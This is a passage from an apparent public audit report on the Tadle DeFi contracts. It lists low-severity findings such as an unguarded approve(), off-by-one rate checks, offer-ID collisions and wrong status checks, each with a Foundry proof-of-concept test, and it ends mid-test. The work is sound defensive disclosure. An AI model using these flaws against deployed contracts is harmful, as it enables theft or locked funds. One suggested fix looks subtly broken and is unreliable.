[philbugcatcher](https://profiles.cyfrin.io/u/philbugcatcher), [dinkras](https://profiles.cyfrin.io/u/dinkras), [purpledragon](https://profiles.cyfrin.io/u/purpledragon), [rbserver](https://profiles.cyfrin.io/u/rbserver), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe). Selected submission by: [justawanderkid](https://profiles.cyfrin.io/u/justawanderkid)._      
            


## Description

The `approve()` function in the `CapitalPool` contract lacks access control, allowing any user to call it. This function sets an unlimited token allowance for the `TokenManager` on a specified token address, enabling unauthorized approvals. natspec of `CapitalPool::approve()` function states that `only can be called by token manager`, but that's not the case here since there's no Modifiers that check the `msg.sender` address to match with `TokenManager` contract address.

## Impact

Unauthorized user can call the `CapitalPool::approve()` function, which breaks the invariant where `approve()` function can only be called as `TokenManager` contract which is stated in natspec of the function.

## Proof of Concepts

Random User Comes and calls `CapitalPool::approve()` function which Gives `TokenManager` Contract Approval to Spend `type(uint256).max` Amount.

```javascript
    function test_anyoneCanCallApproveFunction() external {
        vm.startPrank(user);
        capitalPool.approve(address(mockUSDCToken));
        vm.stopPrank();

        assertEq(mockUSDCToken.allowance(address(capitalPool), address(tokenManager)), type(uint256).max);

        console2.log("This is type(uint256)max:");
        console2.log("                  ", type(uint256).max);

        console2.log("This is The Allowance Amount the 'CapitalPool' Contract Gaved to `TokenContract`:");
        console2.log("                  ", mockUSDCToken.allowance(address(capitalPool), address(tokenManager)));

        console2.log("They Both Match!");
    }
```

the last Assertion checks `TokenManager` Contract Allowance Amount and compares it to `type(uint256).max`.

You can Run the Test with Following Command:

```javascript
    forge test --match-test test_anyoneCanCallApproveFunction -vvvv
```

Take a Look at the `Logs`:

```javascript
    Logs:
        This is type(uint256)max:
                            115792089237316195423570985008687907853269984665640564039457584007913129639935
        This is The Allowance Amount the 'CapitalPool' Contract Gaved to `TokenContract`:
                            115792089237316195423570985008687907853269984665640564039457584007913129639935
        They Both Match!
```

## Recommended Mitigation

Implement access control to restrict the `approve()` function to authorized callers, such as the `TokenManager`:

```diff
+  function approve(address tokenAddr) external onlyTokenManager {
     address tokenManager = tadleFactory.relatedContracts(RelatedContractLibraries.TOKEN_MANAGER);

     (bool success, ) = tokenAddr.call(abi.encodeWithSelector(APPROVE_SELECTOR, tokenManager, type(uint256).max));

     if (!success) {
         revert ApproveFailed();
     }
   }

+  modifier onlyTokenManager() {
+    require(msg.sender == tokenManager, "Caller is not the token manager");
+    _;
+  }
```

This ensures only the `TokenManager` can call the `approve()` function, preventing unauthorized access.

## <a id='L-03'></a>L-03. The referral bonus can't be split correctly between the referrer and the authority referral

_Submitted by [wellbyt3](https://profiles.cyfrin.io/u/wellbyt3), [Dowsers](https://codehawks.cyfrin.io/team/clxlk29vc000duhxavix3v0ya), [mikebello](https://profiles.cyfrin.io/u/mikebello), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [0x1912](https://profiles.cyfrin.io/u/0x1912). Selected submission by: [mikebello](https://profiles.cyfrin.io/u/mikebello)._      
            


## Summary

The referral bonus is meant to be split between the referrer and the authority(the trader who was referred by the referrer), but this is not always possible with the current `updateReferrerInfo` function.

## Vulnerability Details

The docs of the tadle platform say that the referral bonus can be split between the referrer and the authority referral as the referrer wishes, but in the current `updateReferrerInfo` function this is not always possible.

the referral bonus starts at 30%, the referrer should be able to distribute this percentage between him and his referrals  as he wishes, but the `updateReferrerInfo` function revert if `_referrerRate` is less than the `baseReferralRate` which is 30%, this is shown in the code below lines 16-18, this doesn't allow splitting the referral bonus between the referrer and the authority referral.

The referral bonus can be split correctly only when the owner of the contract allows the referrer to give an extra rate: `referralExtraRate` register in the `referralExtraRateMap` mapping.

```Solidity
function updateReferrerInfo(
    address _referrer,
    uint256 _referrerRate,
    uint256 _authorityRate
) external {
    if (_msgSender() == _referrer) {
        revert InvalidReferrer(_referrer);
    }


    if (_referrer == address(0x0)) {
        revert Errors.ZeroAddress();
    }


    if (_referrerRate < baseReferralRate) {
        revert InvalidReferrerRate(_referrerRate);
    }


    uint256 referralExtraRate = referralExtraRateMap[_referrer];
    uint256 totalRate = baseReferralRate + referralExtraRate;


    if (totalRate > Constants.REFERRAL_RATE_DECIMAL_SCALER) {
        revert InvalidTotalRate(totalRate);
    }


    if (_referrerRate + _authorityRate != totalRate) {
        revert InvalidRate(_referrerRate, _authorityRate, totalRate);
    }


    ReferralInfo storage referralInfo = referralInfoMap[_referrer];
    referralInfo.referrer = _referrer;
    referralInfo.referrerRate = _referrerRate;
    referralInfo.authorityRate = _authorityRate;


    emit UpdateReferrerInfo(
        msg.sender,
        _referrer,
        _referrerRate,
        _authorityRate
    );
}
```

The test below shows that when a user tries to split the referral bonus between the referrer and the authority referral the  `updateReferrerInfo` function will revert with the `InvalidReferrerRate` error avoiding this split of the referral bonus.

```Solidity
function test_referral_turbo_usdc() public {
        // the function reverts if the referrer rate is less than 30%, 
  //so the rate can't be split between the referrer and the authority referral.
        vm.prank(user1);
        vm.expectRevert(abi.encodeWithSelector(ISystemConfig.InvalidReferrerRate.selector, 200000));
        systemConfig.updateReferrerInfo(user, 200_000, 100_000);
        vm.stopPrank();

        vm.startPrank(user);
  
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace, address(mockUSDCToken), 1000, 0.01 * 1e18, 12000, 300, OfferType.Ask, OfferSettleType.Turbo
            )
        );

        address offerAddr = GenerateAddress.generateOfferAddress(0);
        preMarktes.createTaker(offerAddr, 500);

        address stock1Addr = GenerateAddress.generateStockAddress(1);
        preMarktes.listOffer(stock1Addr, 0.006 * 1e18, 12000);

        vm.stopPrank();

    }
```

## Impact

The referral bonus can't be  split correctly between the referrer and the authority referral.

## Tools Used

Manual Review

## Recommendations

Modified the `updateReferrerInfo` function to allow the correct split of the referral bonus

## <a id='L-04'></a>L-04. `listOffer` Unsafely References Fungible Identifiers

_Submitted by [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [4gontuk](https://profiles.cyfrin.io/u/4gontuk), [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [pyro](https://profiles.cyfrin.io/u/pyro), [vladzaev](https://profiles.cyfrin.io/u/vladzaev), [matejdb](https://profiles.cyfrin.io/u/matejdb), [eeyore](https://profiles.cyfrin.io/u/eeyore), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [karanel](https://profiles.cyfrin.io/u/karanel), [auditweiler](https://profiles.cyfrin.io/u/auditweiler), [n08ita](https://profiles.cyfrin.io/u/n08ita), [joshuajee](https://profiles.cyfrin.io/u/joshuajee), [KaiThompson](https://profiles.cyfrin.io/u/KaiThompson), [ragnarok](https://profiles.cyfrin.io/u/ragnarok), [fyamf](https://profiles.cyfrin.io/u/fyamf), [atoko](https://profiles.cyfrin.io/u/atoko), [bube](https://profiles.cyfrin.io/u/bube), [salem](https://profiles.cyfrin.io/u/salem), [0xgenaudits](https://profiles.cyfrin.io/u/0xgenaudits), [yotov721](https://profiles.cyfrin.io/u/yotov721), [mikebello](https://profiles.cyfrin.io/u/mikebello), [nervouspika](https://profiles.cyfrin.io/u/nervouspika), [turvec](https://profiles.cyfrin.io/u/turvec), [josh4324](https://profiles.cyfrin.io/u/josh4324), [h2134](https://profiles.cyfrin.io/u/h2134), [hunter_w3b](https://profiles.cyfrin.io/u/hunter_w3b), [silentwalker](https://profiles.cyfrin.io/u/silentwalker), [azanux](https://profiles.cyfrin.io/u/azanux), [bkweb3](https://profiles.cyfrin.io/u/bkweb3), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [n3smaro](https://profiles.cyfrin.io/u/n3smaro), [nikhil20](https://profiles.cyfrin.io/u/nikhil20), [pina](https://profiles.cyfrin.io/u/pina), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [honour](https://profiles.cyfrin.io/u/honour), [atharv181](https://profiles.cyfrin.io/u/atharv181), [krisp](https://profiles.cyfrin.io/u/krisp), [valy001](https://profiles.cyfrin.io/u/valy001), [bladesec](https://profiles.cyfrin.io/u/bladesec), [inzinko](https://profiles.cyfrin.io/u/inzinko), [stanchev](https://profiles.cyfrin.io/u/stanchev), [_frolic](https://profiles.cyfrin.io/u/_frolic), [rbserver](https://profiles.cyfrin.io/u/rbserver), [evilshu](https://profiles.cyfrin.io/u/evilshu), [bareli](https://profiles.cyfrin.io/u/bareli), [dinkras](https://profiles.cyfrin.io/u/dinkras). Selected submission by: [auditweiler](https://profiles.cyfrin.io/u/auditweiler)._      
            


## Summary

The [`listOffer`](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L295C14-L295C23) function depends upon identifiers which may have already been used, assuming them to be unique.

## Vulnerability Details

The [`PreMarkets`](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol) contract uses unsafe identifier logic resulting in collisions that lead to denial of service for core functionality.

Notice the following flow in [`createOffer`](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L39C14-L39C25):

```Solidity
/// @dev generate address for maker, offer, stock.
address makerAddr = GenerateAddress.generateMakerAddress(offerId); /// @audit uses_preincrement_offerId
address offerAddr = GenerateAddress.generateOfferAddress(offerId); /// @audit uses_preincrement_offerId
address stockAddr = GenerateAddress.generateStockAddress(offerId); /// @audit uses_preincrement_offerId

/// @custom:snip

offerId = offerId + 1; /// @audit increment_global_offerId

/// @custom:snip

/// @dev update offer info
offerInfoMap[offerAddr] = OfferInfo({
    id: offerId, /// @audit uses_postincrement_offerId

/// @custom:snip

/// @dev update stock info
stockInfoMap[stockAddr] = StockInfo({
    id: offerId,  /// @audit uses_postincrement_offerId
```

In this sequence, it is clear to see that whenever [`createOffer`](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L39C14-L39C25) is invoked, it is possible to inadvertently use identifiers that are already being used in  previously-created elements of the `offerInfoMap` and `stockInfoMap`.

This is to say that different offers can inadvertently share the same state.

#### PreMarkets.t.sol

In the sequence below, we demonstrate how two calls to [`createOffer`](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L39C14-L39C25) (i.e. through the nondeterminism of shared access to the blockchain) can result in denial of service:

```Solidity
/// @notice Multiple calls to `createOffer` can inadvertently
/// @notice mutate the context of another.
/// @notice For simplicity, we perform all actions as the single
/// @notice `user`, however this is not a requirement, as different
/// @notice users can DoS one-another due to the same flaw.
function test_ask_offer_turbo_eth_dos() public {
    vm.startPrank(user);

    preMarktes.createOffer{value: 0.012 * 1e18}(
        CreateOfferParams(
            marketPlace,
            address(weth9),
            1000,
            0.01 * 1e18,
            12000,
            300,
            OfferType.Ask,
            OfferSettleType.Turbo
        )
    );

    /// @notice Toggle allow the transaction to either revert or succeed.
    bool makeAnotherOffer = true;

    /// @notice When `makeAnotherOffer` is true, we will have the
    /// @notice same user create another offer.
    if (makeAnotherOffer) {
        preMarktes.createOffer{value: 0.012 * 1e18}(
            CreateOfferParams(
                marketPlace,
                address(weth9),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );
    }

    address offerAddr = GenerateAddress.generateOfferAddress(0);
    preMarktes.createTaker{value: 0.005175 * 1e18}(offerAddr, 500);

    address stock1Addr = GenerateAddress.generateStockAddress(1);

    /// @audit When `makeAnotherOffer` is true, it is impossible for
    /// @audit the owner to create a listing. In this instance, the
    /// @audit caller inadvertently returns their original offer
    /// @audit to an uninitialized status, locking their capital.
    if (makeAnotherOffer) vm.expectRevert("Mismatched Marketplace status");
    preMarktes.listOffer(stock1Addr, 0.006 * 1e18, 12000);

}
```

## Impact

Inability to [`listOffer`](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L295C14-L295C23) through the action of indepenent actors, resulting in eventual inability to recouperate capital via the intended process of refunding a listing.

## Tools Used

Manual Review

## Recommendations

Refactor to safely isolate offers from the context of one-another.

## <a id='L-05'></a>L-05. Wrong parameter in event AbortBidTaker()

_Submitted by [0x40](https://profiles.cyfrin.io/u/0x40), [eeyore](https://profiles.cyfrin.io/u/eeyore). Selected submission by: [0x40](https://profiles.cyfrin.io/u/0x40)._      
            


## Summary

Wrong parameter in `event AbortBidTaker()` could cause problems with offchain applications/Dapps, and **mislead the end user**.

## Vulnerability Details

In `IPerMarkets.sol` the `event` is defined as follow :

```Solidity
/// @dev Event when taker aborted
event AbortBidTaker(address indexed stock, address indexed authority);
```

But in `PreMarkets.sol` :\
<https://github.com/Cyfrin/2024-08-tadle/blob/main/src/core/PreMarkets.sol#L696>

```Solidity
function abortBidTaker(address _stock, address _offer) external {
...
emit AbortBidTaker(_offer, _msgSender());
...
}
```

It should be `_stock` and not `_offer`, according to `IPerMarkets.sol`:

```Solidity
emit AbortBidTaker(_stock, _msgSender());
```

## Impact

Off chain applications and Dapps relie on informations given by events, this could lead to several problems in applications, misleading the end user.

## Tools Used

Github, VisualCode.

## Recommendations

Replace  `_offer` by `_stock`.

## <a id='L-06'></a>L-06. Incorrect Check in closeBidOffer function

_Submitted by [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [kwakudr](https://profiles.cyfrin.io/u/kwakudr), [0xnolo](https://profiles.cyfrin.io/u/0xnolo), [MinhTriet](https://profiles.cyfrin.io/u/MinhTriet), [eta](https://profiles.cyfrin.io/u/eta), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [bube](https://profiles.cyfrin.io/u/bube), [0xrolko](https://profiles.cyfrin.io/u/0xrolko), [cheatcode](https://profiles.cyfrin.io/u/cheatcode), [maushishreal](https://profiles.cyfrin.io/u/maushishreal), [0xsecuri](https://profiles.cyfrin.io/u/0xsecuri). Selected submission by: [cheatcode](https://profiles.cyfrin.io/u/cheatcode)._      
            


## Summary

The closeBidOffer function is intended to close a bid offer, but it's checking if the offer status is "Virgin" (presumably meaning untouched or new). This doesn't align with the function's purpose or the comment above the function.

<https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L58>

The comment states:

```solidity
/**
 * @dev offer status must be Settling
 */
```

However, the code is checking for the opposite condition:

```solidity
if (offerInfo.offerStatus != OfferStatus.Virgin) {
    revert InvalidOfferStatus();
}
```

This means the function will revert for any offer that isn't in the Virgin status, which contradicts the intended behavior described in the comment.

## Impact

Funds could potentially be locked in the contract. If bid offers can't be closed properly, the deposited funds for these offers might become inaccessible. This could lead to a loss of funds for users who can't retrieve their unused bid amounts.

## Mitigation

The condition should be changed to check for the Settling status instead.

```solidity
if (offerInfo.offerStatus != OfferStatus.Settling) {
    revert InvalidOfferStatus();
}
```

And the correct comment should be:

```solidity
/**
 * @notice Close bid offer
 * @dev caller must be offer authority
 * @dev offer type must be Bid
 * @dev offer status must be Settling
 * @dev refund amount = offer amount - used amount
 */
```

## Poc

```solidity
function test_close_bid_offer() public {
    vm.startPrank(user);
    preMarktes.createOffer(
        CreateOfferParams(
            marketPlace,
            address(mockUSDCToken),
            1000,
            0.01 * 1e18,
            12000,
            300,
            OfferType.Bid,
            OfferSettleType.Turbo
        )
    );
    
    address offerAddr = GenerateAddress.generateOfferAddress(0);
    
    preMarktes.createTaker(offerAddr, 500);
    
    preMarktes.setOfferStatus(offerAddr, OfferStatus.Settling);
    
    deliveryPlace.closeBidOffer(offerAddr);
    
    OfferInfo memory offerInfo = preMarktes.getOfferInfo(offerAddr);
    assertEq(uint(offerInfo.offerStatus), uint(OfferStatus.Settled), "Offer should be in Settled status");
    
    vm.stopPrank();
}
```

Add this function for testing purposes

```solidity
function setOfferStatus(address _offer, OfferStatus _status) public {
    require(block.chainid == 31337, "This function is only for testing");
    offerInfoMap[_offer].offerStatus = _status;
}
```

## <a id='L-07'></a>L-07. PreMarkets - Unable to withdraw platform rewards

_Submitted by [Bauer](https://profiles.cyfrin.io/u/Bauer), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [irondevx](https://profiles.cyfrin.io/u/irondevx), [0xswahili](https://profiles.cyfrin.io/u/0xswahili), [n08ita](https://profiles.cyfrin.io/u/n08ita), [Hrom131](https://profiles.cyfrin.io/u/Hrom131), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [fyamf](https://profiles.cyfrin.io/u/fyamf), [pascal](https://profiles.cyfrin.io/u/pascal), [unique0x0](https://profiles.cyfrin.io/u/unique0x0), [touthang](https://profiles.cyfrin.io/u/touthang), [nikhil20](https://profiles.cyfrin.io/u/nikhil20), [bladesec](https://profiles.cyfrin.io/u/bladesec), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [zukanopro](https://profiles.cyfrin.io/u/zukanopro). Selected submission by: [Hrom131](https://profiles.cyfrin.io/u/Hrom131)._      
            


## Summary

The platform code does not provide secure ways to derive platform revenue with updating `platformFee` field values inside `PreMarkets` contract. 

## Vulnerability Details

When users interact with the platform, `platformFee` is accumulated in `MakerInfo` inside `PreMarkets` contracts, which displays the platform's earnings for a particular **maker**. 

The vulnerability is that the system code does not add functions by which, for example, a contract owner would be able to derive platform revenues with further updates to the values of the `platformFee` parameter.

Of course, the `TokenManager` contract has a `rescue` function that can withdraw tokens from the contract, but this method for withdrawing rewards is a bad option as it will never update the values of the `platformFee` parameters inside the `PreMarkets` contract. This in turn leads to a complicated calculation of how many tokens to withdraw between income withdrawals.

## Impact

Complicated platform rewards calculation and withdrawal process, which is not very trustworthy from the users' point of view, and also does not update the values of `platformFee` parameters inside the `PreMarkets` contract.

## Tools Used

Manual auditing of the protocol code was used to discover the vulnerability. No third-party programs were used.

## Recommendations

Add a function to withdraw platform rewards.

You could also change the logic of accumulating platform rewards a bit. Instead of writing values inside each `MakerInfo`, you could have one variable at the contract level. Then it would be easy to get the total value of the protocol rewards and would be cheaper since only one value would need to be updated.
## <a id='L-08'></a>L-08. Validation of `collateralRate` in `PerMarkets::createOffer` function

_Submitted by [0xreadyplayer1](https://profiles.cyfrin.io/u/0xreadyplayer1), [abandonedplanetplut](https://profiles.cyfrin.io/u/abandonedplanetplut), [sabit](https://profiles.cyfrin.io/u/sabit), [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3), [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [pro_king](https://profiles.cyfrin.io/u/pro_king), [brene](https://profiles.cyfrin.io/u/brene), [0xMilenov](https://profiles.cyfrin.io/u/0xMilenov), [maushishreal](https://profiles.cyfrin.io/u/maushishreal), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [hunter_w3b](https://profiles.cyfrin.io/u/hunter_w3b). Selected submission by: [hunter_w3b](https://profiles.cyfrin.io/u/hunter_w3b)._      
            


## Summary

The  `PerMarkets::createOffer` function currently includes a validation check to ensure that the `collateralRate` parameter is at least 100% by comparing it against a constant (`Constants.COLLATERAL_RATE_DECIMAL_SCALER`). However, the documentation specifies that the collateralRate must be greater than 100% ` * @dev collateralRate must be more than 100%, decimal scaler is 10000`.

## Vulnerability Details

The current implementation only enforces that the collateralRate is not less than 100%, which means a collateralRate equal to 100% would be incorrectly accepted.

```solidity
    function createOffer(CreateOfferParams calldata params) external payable {
        /**
         * @dev points and amount must be greater than 0
         * @dev eachTradeTax must be less than 100%, decimal scaler is 10000
         * @dev collateralRate must be more than 100%, decimal scaler is 10000
         */
        if (params.points == 0x0 || params.amount == 0x0) {
            revert Errors.AmountIsZero();
        }

        if (params.eachTradeTax > Constants.EACH_TRADE_TAX_DECIMAL_SCALER) {
            revert InvalidEachTradeTaxRate();
        }

 @>>       if (params.collateralRate < Constants.COLLATERAL_RATE_DECIMAL_SCALER) {
            revert InvalidCollateralRate();
        }

```

### POC

```solidity

    function test_ask_offer_turbo_usdc() public {
        vm.startPrank(user);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                0.01 * 1e18,
@>>                10000,
                300,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );

        address offerAddr = GenerateAddress.generateOfferAddress(0);
        preMarktes.createTaker(offerAddr, 500);

        address stock1Addr = GenerateAddress.generateStockAddress(1);
        preMarktes.listOffer(stock1Addr, 0.006 * 1e18, 10000);

        address offer1Addr = GenerateAddress.generateOfferAddress(1);
        preMarktes.closeOffer(stock1Addr, offer1Addr);
        preMarktes.relistOffer(stock1Addr, offer1Addr);

        vm.stopPrank();

        vm.prank(user1);
        systemConfig.updateMarket(
            "Backpack",
            address(mockPointToken),
            0.01 * 1e18,
            block.timestamp - 1,
            3600
        );

        vm.startPrank(user);
        mockPointToken.approve(address(tokenManager), 10000 * 10 ** 18);
        deliveryPlace.settleAskMaker(offerAddr, 500);
        deliveryPlace.closeBidTaker(stock1Addr);
        vm.stopPrank();
    }
```

```solidity

Ran 1 test for test/PreMarkets.t.sol:PreMarketsTest
[PASS] test_ask_offer_turbo_usdc() (gas: 1356543)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.13ms (1.68ms CPU time)

```

## Impact

Allowing a `collateralRate` of exactly 100% when the system requires it to be strictly greater than 100% could lead to inadequate collateralization.

## Tools Used

Manual Review

## Recommendations

Update the validation logic to enforce that the collateralRate must be strictly greater than 100%. The condition should be modified as follows:

```diff
-          if (params.collateralRate < Constants.COLLATERAL_RATE_DECIMAL_SCALER) {
+          if (params.collateralRate <= Constants.COLLATERAL_RATE_DECIMAL_SCALER) {
            revert InvalidCollateralRate();
        }
```

## <a id='L-09'></a>L-09. CreateOffer allows eachTradeTax to be 100% ( 10000 bp ) violating code assumptions

_Submitted by [0xreadyplayer1](https://profiles.cyfrin.io/u/0xreadyplayer1), [sabit](https://profiles.cyfrin.io/u/sabit), [abandonedplanetplut](https://profiles.cyfrin.io/u/abandonedplanetplut), [0xbeastboy](https://profiles.cyfrin.io/u/0xbeastboy), [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3), [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [brene](https://profiles.cyfrin.io/u/brene), [0xMilenov](https://profiles.cyfrin.io/u/0xMilenov), [mgf15](https://profiles.cyfrin.io/u/mgf15), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [0xsecuri](https://profiles.cyfrin.io/u/0xsecuri), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe). Selected submission by: [0xreadyplayer1](https://profiles.cyfrin.io/u/0xreadyplayer1)._      
            


## Summary

The code comments in definition of Premarket.sol#CreateOffer states that&#x20;

```solidity
eachTradeTax must be less than 100%, decimal scaler is 10000
```

&#x20;, however , the code only reverts if `eachTradeTax `is greater than 10\_000 

, leaving room for erroneous offers creation at the exact Trade tax of 10\_000 or 100% that will affect future integrations and development due developer's assumptions being wrong.

## Vulnerability Details

Here are the code blocks that might be helpful to visualize and understand the issue

\`PreMarket.sol\`

```Solidity
  function createOffer(CreateOfferParams calldata params) external payable {
       /**
         * //snip
         * @dev eachTradeTax must be less than 100%, decimal scaler is 10000
         * //snip
         */
      
        //snip

        if (params.eachTradeTax > Constants.EACH_TRADE_TAX_DECIMAL_SCALER) {
            revert InvalidEachTradeTaxRate();
        }

```

#### Proof of Concept

```Solidity
    // forge test --mt test_create_offer_for_100_percent_eachTradeTax -vvvv
    function test_create_offer_for_100_percent_eachTradeTax() public {
        vm.startPrank(user);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                0.01 * 1e18,
                12_000,
                10_000,
                OfferType.Ask,
                OfferSettleType.Turbo
            ) 
        );
    }

```

#### PoC Output

```JavaScript
Ran 1 test for test/PreMarkets.t.sol:PreMarketsTest
[PASS] test_create_offer_for_100_percent_eachTradeTax() (gas: 540682)
Traces:
  [540682] PreMarketsTest::test_create_offer_for_100_percent_eachTradeTax()
    ├─ [0] VM::startPrank(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf)
    │   └─ ← [Return] 
    ├─ [525720] UpgradeableProxy::createOffer(CreateOfferParams({ marketPlace: 0xE6b1c25C9BAC2B628d6E2d231F9B53b92172fC2D, tokenAddress: 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a, points: 1000, amount: 10000000000000000 [1e16], collateralRate: 12000 [1.2e4], eachTradeTax: 10000 [1e4], offerType: 
0, offerSettleType: 1 }))
```

## Impact

Offers with wrong each Trade Tax rate will be created , jeopardising Current and Future developments + Integrations with the protocol

## Tools Used

Manual Review , Foundry

## Recommendations

Ensure that in CreateOffer inside PreMarket , eachTradeTax needs to be less than 10\_000

```Solidity
function createOffer(CreateOfferParams calldata params) external payable {\
//snip

if (params.eachTradeTax >= Constants.EACH_TRADE_TAX_DECIMAL_SCALER) {
            revert InvalidEachTradeTaxRate();
        }

    //snip
```

## <a id='L-10'></a>L-10. Missing validation in `PreMarkets.abortBidTaker()` leading to funds lock.

_Submitted by [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [eeyore](https://profiles.cyfrin.io/u/eeyore), [n3smaro](https://profiles.cyfrin.io/u/n3smaro), [waydou](https://profiles.cyfrin.io/u/waydou). Selected submission by: [eeyore](https://profiles.cyfrin.io/u/eeyore)._      
            


## Summary

There is a missing validation in the `PreMarkets.abortBidTaker()` function that fails to check whether the offer is actually a `Bid` offer. Without this check, a user can call this function with their `Bid` stock of an `Ask` offer, which can lead to funds being locked if the collateral ratio is greater than 100%.

## Vulnerability Details

There are other issues that, when fixed, will reveal additional problems in the `PreMarkets.abortBidTaker()` function.

### Preconditions

1. The issue with `overinflated maker refund when collateral ratio is > 100%` in the `PreMarkets.abortAskOffer()` function is fixed. This issue was reported separately. Assume the function is working as expected.

```solidity
File: PreMarkets.sol
607:         uint256 totalDepositAmount = OfferLibraries.getDepositAmount(
608:             offerInfo.offerType,
609:             offerInfo.collateralRate,
610:             totalUsedAmount,
611:             false, // <== should be true
612:             Math.Rounding.Ceil
613:         );
```

2. The issue with `incorrect depositAmount calculation` in the `PreMarkets.abortBidTaker()` function is fixed. This issue was reported separately. Assume the calculation of the `depositAmount` value works as expected.

```solidity
File: PreMarkets.sol
671:         uint256 depositAmount = stockInfo.points.mulDiv(
672:             preOfferInfo.points, // <== incorrect; should be preOfferInfo.amount
673:             preOfferInfo.amount, // <== incorrect denominator; should be preOfferInfo.points
674:             Math.Rounding.Floor
675:         );
```

### Scenario

Given the above preconditions, consider the following scenario:

1. The maker creates an `Ask` offer for 50 points for 50 USDC, with a 200% collateral ratio, and deposits 100 USDC as collateral.
2. The taker accepts this `Ask` offer for 25 points for 25 USDC.
3. The maker aborts the `Ask` offer, retrieving 50 USDC of collateral and leaving 50 USDC as compensation for the taker.
4. The taker can now call `PreMarkets.abortBidTaker()`. Since the function does not check if the offer is a `Bid` offer, the taker can mistakenly call this function. The calculations for the `transferAmount` do not account for the collateral ratio, so the taker receives only 25 USDC. An additional 25 USDC that were used as collateral are locked in the contract and lost.

Although it is user error to call `PreMarkets.abortBidTaker()` instead of `DeliveryPlace.closeBidTaker()` (which would correctly refund 50 USDC), the end result is that the user loses funds, and they are locked in the system.

## Impact

- Funds are locked.

## Tools Used

- Manual review.

## Recommendations

Add validation in the `PreMarkets.abortBidTaker()` function to ensure the offer is a `Bid` offer before proceeding with execution.

## <a id='L-11'></a>L-11. The user will be able to close Bid Offer even in case if marketplace is not in BidSettling

_Submitted by [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [0xaman](https://profiles.cyfrin.io/u/0xaman). Selected submission by: [0xaman](https://profiles.cyfrin.io/u/0xaman)._      
            


## Summary

The owner of a bid offer will call `closeBidOffer` to close the bid. The bid offer should only be closed when the market is in the `BidSettling` state. However, the current code allows the owner to close the bid even when the market is in the `AskSettling` state.

## Vulnerability Details

The Tadle market maintains different statuses for various purposes. If The market is in the `Online` state,The takers and makers can place their offers for bids and asks. After the TGE phase, the market transitions to the `AskSettling` state. Following the TGE and the settlement period, the market moves to the `BidSettling` state.

The issue here is that the owner should only be allowed to close a bid offer when the market is in the `BidSettling` state. However, the code currently checks for both `BidSettling` and `AskSettling` states, which means that a bid offer can be closed even when the market is in the AskSettling state.

```solidity
    function closeBidOffer(address _offer) external {
        (
            OfferInfo memory offerInfo,
            MakerInfo memory makerInfo,
            ,
            MarketPlaceStatus status
        ) = getOfferInfo(_offer);

        if (_msgSender() != offerInfo.authority) {
            revert Errors.Unauthorized();
        }

        if (offerInfo.offerType == OfferType.Ask) {
            revert InvalidOfferType(OfferType.Bid, OfferType.Ask);
        }

        if (
@1>            status != MarketPlaceStatus.AskSettling &&
            status != MarketPlaceStatus.BidSettling
        ) {
            revert InvaildMarketPlaceStatus(); 
        }
```

### POC :

Add following test case to `PreMarket.t.sol` :

```solidity
    function test_Close_Bid_Offer_In_AskSettling() public {
        vm.startPrank(user);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Bid,
                OfferSettleType.Turbo
            )
        );

        address offerAddr = GenerateAddress.generateOfferAddress(0);
        preMarktes.createTaker(offerAddr, 1000);
        vm.stopPrank();

        vm.startPrank(user1);
        systemConfig.updateMarket(
            "Backpack",
            address(mockPointToken),
            0.01 * 1e18,
            block.timestamp - 1,
            3600
        );
        // upddate the market status only for assertion purpose
        systemConfig.updateMarketPlaceStatus(
            "Backpack",
            MarketPlaceStatus.AskSettling
        );
